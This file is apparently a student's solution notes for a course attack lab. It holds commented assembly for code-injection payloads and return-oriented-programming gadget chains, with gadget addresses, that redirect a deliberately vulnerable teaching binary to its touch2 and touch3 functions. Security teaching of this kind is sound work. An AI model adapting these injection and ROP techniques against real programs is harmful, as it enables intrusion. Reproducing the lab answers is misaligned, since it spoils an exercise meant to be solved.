# assembler code for part1/level2
# mov $0x306ff558,%rdi   # move cookie to %rdi
# sub $0x18,%rsp         # align to 16 bytes
# ret

# assembler code for part1/level3
# mov $0x55637c38,%rdi   # move the address of cookie string to %rdi
# sub $0x18,%rsp         # align to 16 bytes
# ret

# assembler code for part2/level2
# pop %rax  nop  nop     # 58 90 90 @0x40226c
# ret                    # jmp to gadget2
# mov %rax,%rdi  nop     # 48 89 c7 90 @0x40224b
# ret                    # jmp to touch2

# assembler code for part2/level3
## mov %rsp %rax ret           # @0x402394 
## mov %rax %rdi ret           # store original %rsp @0x40224b
## pop %rax ret                # get the offset of cookie to original %rsp @0x40222b
## mov %eax %ecx ret           # @0x402321
## mov %ecx %edx ret           # @0x40230b
## mov %edx %esi ret           # @0x4022d4
## lea (%rdi,%rsi,1),%rax ret  # get the address of cookie @0x40227e
## mov %rax %rdi               # @0x40224b
## ret                         # jump to touch3 @0x402053

# assembler code for part3/level3 (same as those in part2/level3)
## mov %rsp %rax ret            
## mov %rax %rdi ret           # store original %rsp
## pop %rax ret                # get the offset of cookie to original %rsp 
## mov %eax %ecx ret
## mov %ecx %edx ret 
## mov %edx %esi ret
## lea (%rdi,%rsi,1),%rax ret  # get the address of cookie
## mov %rax %rdi
## ret                         # jump to touch3